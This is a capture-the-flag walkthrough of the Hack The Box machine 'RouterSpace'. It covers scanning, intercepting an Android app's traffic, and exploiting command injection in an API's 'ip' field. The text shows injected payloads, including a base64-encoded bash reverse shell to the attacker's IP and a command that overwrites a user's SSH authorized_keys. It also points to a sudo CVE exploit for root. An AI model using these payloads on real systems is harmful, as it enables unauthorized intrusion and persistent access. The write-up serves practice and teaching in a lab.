# RouterSpace
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313996-2c2024f2-3775-4bfb-9809-5d51005379c3.png)

## Tags

APK file

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Parrot OS
* IP Address: 10.10.14.225

Victim:
* Name: victim_machine
* IP Address: 10.10.11.148
* Other information must be gathered during the attack

## Phase 1: Enumeration

```
$ nmap -sC -sV 10.10.11.148

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 16:46 CET
Nmap scan report for routerspace.htb (10.10.11.148)
Host is up (0.12s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-21347
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 73
|     ETag: W/"49-qCsnSdMJfYIsRsFrMyQFLEvDuow"
|     Date: Fri, 18 Mar 2022 16:04:33 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: T xnyK r2 V f 8S l 9 }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-2357
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Fri, 18 Mar 2022 16:04:32 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-60934
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Fri, 18 Mar 2022 16:04:32 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
<SNIP>
```
The port `80` is open, so let's visit the website by the browser. From there, the only useful element is the download of a `.apk` file.

Let's download it and install the tools we need for simulating it. The tools to install are **Anbox** and **Android Debug Bridge (ADB)** (instead of Anbox we can also use android studio or genymotion it's work the same). We need also ADB because Anbox only and its tools are fairly limited (no Google Play Store installed). For this reason, ADB can help us to push Android APKs to your virtual Android install in Anbox:
```
$ sudo apt install anbox
$ sudo apt install android-tools-adb
```
For first, we need to run Anbox. It needs of the ashmem and binder kernel drivers otherwise we cannot run it:
```
$ sudo modprobe ashmem_linux
$ sudo modprobe binder_linux
$ sudo service anbox-container-manager start
anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity
```
After Anbox is running, let's to install `RouterSpace.apk` on our Anbox emulator by using `adb` command:
```
$ adb install RouterSpace.apk
```
Now we should have the RouterSpace app installed on our Anbox environment. Let's understand how this app works. If we open it, we have only a button "Check Status" that should send requests to the target server. Let's intercept it by Burpsuite. For doing it, we must configure a Proxy on Anbox (`10.10.14.225` is the attacker IP address):
```
$ adb shell settings put global http_proxy 10.10.14.225:8001
```
Then, on Burpsuite let's set another proxy address as `10.10.14.225:8001` in Proxy->Options menu.

Note: for listing all the global settings on ADB, type `adb shell settings list global`.

After this configuration, if we come back to the RouterSpace app and we click on "Check Status", this request will be intercepted by Burp. From the HTTP request, we see that the app tries to contact `routerspace.htb`, so we need to add this domain name in our `/etc/hosts` file as:
```
10.10.11.148 routerspace.htb
```
otherwise it cannot reach the target server.

## Phase 2: Foothold

Then, by using Burp Repeater, and sending the request, we get a 200 response, so the connection is good.

Let's try to test the parameter in our HTTP request to check for some injection. We discover it is vulnerable to command injection:
```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 23
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate

{
    "ip":"0.0.0.0;whoami"
}
```
`;` character helped us to inject the OS command. At this point let's gain a reverse shell. Set locally our netcat:
```
nc -lvnp 4444
```
And then send the following request by Burp Repeater:
```
<SNIP>
{
    "ip":"0.0.0.0;bash -c \"echo YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjI1LzQ0NDQgMD4mMQo= | base64 -d | bash -i\""
}
```
But no luck. I try different methods to get rev shell but non of them working because of ip tables rules.

Let's go to take the user flag by simply using `cat /home/paul/user.txt`.

Then, since we cannot get a reverse shell, we knew that SSH port `22` was opened, so let's try to see if `paul` user has the authorization key we can use for connecting by our shell:
```
<SNIP>
{
    "ip":"0.0.0.0;cat /home/paul/.ssh/authorized_keys"
}
```
The response is:
```
<SNIP>
"0.0.0.0\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVFt3inFv9SRBpKUFHJEQpkyxeqTRJ1RxJBPtBJOvrLOdJYzUV/ZNY2dUB7iXveVRjSr348yoH5lf8+NqyC9bCZZZocqicwY0VgKUDsFzcGCaWbUO5M+6u13TJZmp6LRse0KMFCWc8knpmmGmS5eF7uveoBQuWjVe0ko+3MutEEJe0Vou1FSGHOMzyx2a6fZ76UKxCa4hdEGD6D1I+a8VkcASrhBNFu0AFaLxQgbN5ig7nnJ+5H3kF+dxzh9kqTOf4+K+mUIganLwik/osWWzR44v9UdDQE4VQ0S2F3p9+8E63Ykv8HzCnmPKhpetzQI2gBZv7IULySq/wmpFHqXPxokaEkAA/hTAcbyEk6LLtpdUIMmkecLIzEU2vtdLCz049FzXKnEs3ieC6TlwXO5pxp6QmZoEK9RVQsWctdW8gbfrYF2coEUdnIb8R5f1KHKEuUHi8MYbt+MGaEutBCWRMYpo/q0Z619eP1IVO7Eil3uXxfQffF+CYVCbbc8Ahb/c= andremachado@MBP-de-Andre.Home\n"
```
It means that all the public keys stored here are permitted to access by SSH to the server (there are not private keys we can use). At this point, let's make our public key and copy it to the `/home/paul/.ssh/authorized_keys` folder of target server:
```
$ ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:ecihKNVFxOLHnMXgiHmfWGpMyHOnlShN2OEvzxmxJ+c root@kali
The key's randomart image is:
+---[RSA 3072]----+
|     oo==o       |
|   ..Oo=..o      |
|    O.X+Oo       |
|   . O.%=B       |
|  . . O.S +      |
|   . . + O       |
|        + E      |
|                 |
|                 |
+----[SHA256]-----+
```
Let's take the content of our `$HOME/.ssh/id_rsa.pub` and copy to the target server by Burp Repeater:
```
<SNIP>
{
    "ip":"0.0.0.0;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsmBo9EXlLj1kH5CXxw6GdRFI5nidVhFKc9ejoUh70meFVGt0SIyJBmgpUJfqEhansjQHM3ejT3idYiddiqHajPmKMGquf41WUNiAY63NBYuFbswqwC8ymozR+AdgLme6nmozwtgPKEtDnqPyOrmaG8SymBwN0ZHLfWmWM5BJgN4ApV+JM44zOfI51j8qW3r5xr7v/rN7wtMPcphxQCoDEMg1pmc2sbrrIlTVHKBcHApEwQpmsS+IsHt3MsSW7eQa2IFrSANSoX9JWQT+0oYMf5esqXqW0BQp9qV3+eomtluMOJ6mWC6hxfBsW6AiTIJz56pLJpKExWTc8qZkKjd13F+Zpew9M5SmiGLi2J2cY7TQfR/tW3i/zjfFNYLzCyTZ11VllXjX4RL30kyUXEuhVJe2LNpdhfqXw/4W4TjKdqbZxEKpa6KyUzRdUsQD6YbOexd4/WU0v7R5pPdi39Ol+Q8fdxRTRV7MJ7PGoNXquz+jffckN/SSWQhGaxBNUwJU= daniel@MarkUp' > /home/paul/.ssh/authorized_keys"
}
```
Then, change the permission on our `id_rsa` private key that we will use for authenticating:
```
chmod 400 ../.ssh/id_rsa
```
Then, let's connect to the target server by our private key:
```
ssh -i ~/.ssh/id_rsa paul@10.10.11.148
```
In this way, our private key corresponds to our authorized public key we injected in the target server.

## Phase 3: Privilege Escalation

From here, we can use privilege escalation tools as `linpeas.sh` for checking for some privilege escalation.

In my case `linpeas.sh` is already in the home folder of the user. If it is not there, just use SCP protocol to move the file from attacker machine to the target machine by:
```
scp -i ~/.ssh/id_rsa linpeas.sh paul@10.10.11.148:.
```
Running `linpeas.sh` we can note a:
```
<SNIP>
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31

./linpeas.sh: 1189: [[: not found
./linpeas.sh: 1189: rpm: not found
./linpeas.sh: 1189: 0: not found
./linpeas.sh: 1199: [[: not found
<SNIP>
```
Searching on Internet, it refers to [CVE-2021-3156](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py).

Take that `.py` script, move it to the target machine by SCP, then run it.

Now you are `root` and you can gain the flag `/root/root.txt`.
